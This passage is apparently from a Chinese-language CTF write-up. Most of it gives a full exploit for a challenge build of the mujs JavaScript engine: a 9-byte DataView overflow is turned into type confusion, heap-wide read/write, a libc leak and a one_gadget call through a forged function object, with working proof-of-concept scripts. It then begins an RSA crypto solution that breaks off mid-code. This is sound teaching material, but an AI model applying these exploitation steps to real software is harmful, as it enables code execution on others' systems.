789101112static void Dv_setUint8(js_State *J)&#123; js_Object *self = js_toobject(J, 0); if (self-&gt;type != JS_CDATAVIEW) js_typeerror(J, &quot;not an DataView&quot;); size_t index = js_tonumber(J, 1); uint8_t value = js_tonumber(J, 2); if (index &lt; self-&gt;u.dataview.length+0x9) &#123; self-&gt;u.dataview.data[index] = value; &#125; else &#123; js_error(J, &quot;out of bounds access on DataView&quot;); &#125;&#125; 值得注意的是这里同时也存在一个整数溢出（但是是无符号的)，可以让我们可以前溢9字节。但是由于这里没有什么free的操作，所以很难利用。因此还是后溢9字节可用性高一点。 利用漏洞类型混淆因为说溢出9字节，这个多出的一字节很容易令人联想到类型混淆。下面是 js_Object 的结构。可见只要溢出一字节就可以覆盖它的type字段。 1234567struct js_Object&#123; enum js_Class type; int extensible; js_Property *properties; ...&#125; 下面给出类型混淆的poc 123456789b = DataView(0x68);a = DataView(0x48);b = DataView(0x48);c = DataView(0x48);print(c)b.setUint8(0x48+8, 8); // change type of c to somethingprint(c) 输出为 12[object DataView][object String] 越界写Dataview的Length字段js_Objec 使用了 C语言里的union结构，所以不同类型可以共用相同的内存。队友的想法是利用与DataView里Length字段占用内存相同的其他类型的字符来修改DataLength。这样我们就可以扩大任意地址读写的范围，起码可以拓展到整个堆上了，而不仅仅是越界9字节。 整个Js_Objec 结构体如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849struct js_Object&#123; enum js_Class type; int extensible; js_Property *properties; int count; js_Object *prototype; union &#123; int boolean; double number; struct &#123; const char *string; int length; &#125; s; struct &#123; int length; &#125; a; struct &#123; js_Function *function; js_Environment *scope; &#125; f; struct &#123; const char *name; js_CFunction function; js_CFunction constructor; int length; void *data; js_Finalize finalize; &#125; c; js_Regexp r; struct &#123; js_Object *target; js_Iterator *head; &#125; iter; struct &#123; const char *tag; void *data; js_HasProperty has; js_Put put; js_Delete delete; js_Finalize finalize; &#125; user; struct &#123; uint32_t length; uint8_t* data; &#125; dataview; &#125; u;// ...&#125;; 比如js_Object.u.dataview.length 在结构体内所处的偏移是和js_Object.u.number 以及s_Object.u.c.name这两个是相同的。 所以我们可以修改js_Object.u.number，队友找到了下面的代码 12345678910111213static void js_setdate(js_State *J, int idx, double t)&#123; js_Object *self = js_toobject(J, idx); if (self-&gt;type != JS_CDATE) js_typeerror(J, &quot;not a date&quot;); self-&gt;u.number = TimeClip(t); js_pushnumber(J, self-&gt;u.number);&#125;// ... called from herestatic void Dp_setTime(js_State *J)&#123; js_setdate(J, 0, js_tonumber(J, 1));&#125; 让我们试一下 JS_CDATE的值是10，我们需要把这个DataView结构的type字段溢出成10就可以了 12345678910b = DataView(0x68);a = DataView(0x48);b = DataView(0x48);c = DataView(0x48);print(c)b.setUint8(0x48+8, 10); // set type of c to Dateprint(c)c.setTime(0) 结果： 1234[object DataView][object Date]TypeError: undefined is not callable at tconf.js:10 Emmm，居然是报错了。难道进行了类型混淆还是不能调用setTime方法么？队友曾经为了这个问题困扰了许久，他意识到了对象的prototype 在我们一创建的时候其实就已经确定了。所以当我们改变type的时候prototype并没有改变。而prototype基本就已经定义了这个对象可以调用哪些方法，可恶。 这时无敌的队友发现，js里有个讨厌的东西叫 this，这个东西在这个时候算是雪中送碳吧 我们仍然可以通过js的bind调用setTime : 1Date.prototype.setTime.bind(c)(12) 成功了！ 12345678910111213b = DataView(0x68);a = DataView(0x48);b = DataView(0x48);c = DataView(0x48);print(c)b.setUint8(0x48+8, 10); // set type of c to Dateprint(c)Date.prototype.setTime.bind(c)(1.09522e+12)b.setUint8(0x48+8, 16); // type of c back to DataViewprint(c.getLength()) 看到这里大家可能会有些疑问，就是u.number是8字节的double类型，而我们要覆盖的u.dataview.length只有四字节，这样会不会覆盖到后面紧跟着的四字节的u.dataview.data，毕竟这个是个指针，覆盖掉了容易导致crash。其实是不会的，因为这个结构体有8字节对齐。 使用堆上的越界读写来实现代码执行到了这个阶段，我们已经可以通过修改dataview的length字段来实现堆上的任意地址读写了。并且堆布局也是我们相对可控的了。为了更好的控制堆上的结构，我的队友在c后面又申请了两个Dataview。并且我们知道，如果我们申请的堆的大小大于128k的话我们会使用mmap来申请空间，这个是malloc函数的一个策略。而这个mapp的地址往往距离libc地址很近，因此我们可以通过这种方法来泄漏libc基地址。 所以我们用上述的方法泄漏了libc地址之后，可以伪造一个JS_CCFUNCTION类型，他有一个字段叫做u.c.function我们可以轻易用下面的方式调用这个函数指针 123456void js_call(js_State *J, int n)&#123;// ... jsR_callfunction(J, n, obj-&gt;u.f.function, obj-&gt;u.f.scope);// ...&#125; 最终exp1234567891011121314151617181920212223242526272829303132b = DataView(0x68);a = DataView(0x48);b = DataView(0x48);c = DataView(0x48);e = DataView(0x48);f = DataView(0x1000 * 0x1000);b.setUint8(0x48+8, 10); // set c type to DateDate.prototype.setTime.bind(c)(1.09522e+12) // write number + lengthb.setUint8(0x48+8, 16); // set c type back to DataViewsh32 = 4294967296 // 1&lt;&lt;32libb_addr_off = 472libc_leak = c.getUint32(libb_addr_off) + (c.getUint32(libb_addr_off+4)*sh32)libc_off = 0x7ffff7c31000 - 0x7ffff6bfe010 // got this from gdblibc_base = libc_leak + libc_offprint(&#x27;libc base:&#x27;, libc_base.toString(16))one_gag = libc_base + 0xe6c84print(&#x27;onegadget:&#x27;, one_gag.toString(16))e_obj_off = 192c.setUint8(160, 4) // this sets type to JS_CCFUNCTION// set lower 4 bytes of js_CFunction functionc.setUint32(e_obj_off+8, one_gag&amp;0xffffffff) // set upper 4 bytes of js_CFunction functionc.setUint32(e_obj_off+8+4, Math.floor(one_gag/sh32)&amp;0xffffffff) e() // e is now a function so we can call it 队友表示他之前也没做过这种mujs的利用，但是这些堆利用的基本思路和很多大型项目比如v8的利用是共通的，但是那些大型项目由于运行时更为复杂，堆空间要相对更不可控一些。 Cryptolarge case思路如下： 这题没有提供e，给了p、q、r，并且条件里说了e由三个素因子组成，所以不难想到分解p-1，q-1，r-1，从而对e的可能值进行组合。不过就算组合过了，也不能用常规方法解题，因为本题e phi不互素，所以考虑对其开根，又考虑到这题的e会相对较大，所以用amm算法对其开根。在这之前可以对e的因子进行猜测，由于需要使用到crt组合，所以因子不会太大，并且因子不会是共有的因数，于是可以猜测e使用p-1中的757，q-1中的66553，r-1中的5156273（如果不对，再进行调整，可供调整的选择不多，一些小的因数比如3、7，可以直接跑，很快就可以知道不满足）。这是可以注意到flag的长度在1025-2048比特之间，所以我们不需要考虑r的部分，只考虑p、q。有了猜测的e，我们就可以把多于2048的pad去掉，留下一部分\x00$$c\equiv{m^e(2^{1024})^e}\pmod{n} $$$$c2^{-1024e}\equiv{m^e}\pmod{n}$$ 之后分别计算模p和模q的情况 $$cp\equiv{m^{e1 	imes e2 	imes e3}}\pmod{p} $$ $$cp^{-e2 	imes e3}\equiv{m^{e1}}\pmod{p} $$ $$ cq\equiv{m^{e1 	imes e2 	imes e3}}\pmod{q} $$ $$cq^{-e1 	imes e3}\equiv{m^{e2}}\pmod{q} $$ 对上面的式子使用amm算法，就可以得到mp、mq的列表，然后使用crt对其组合，用SUSCTF校验即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899from Crypto.Util.number import *import timeimport randomc =  =  =  = # fp = [2, 7, 757, 1709, 85015583 , 339028665499, 149105250954771885483776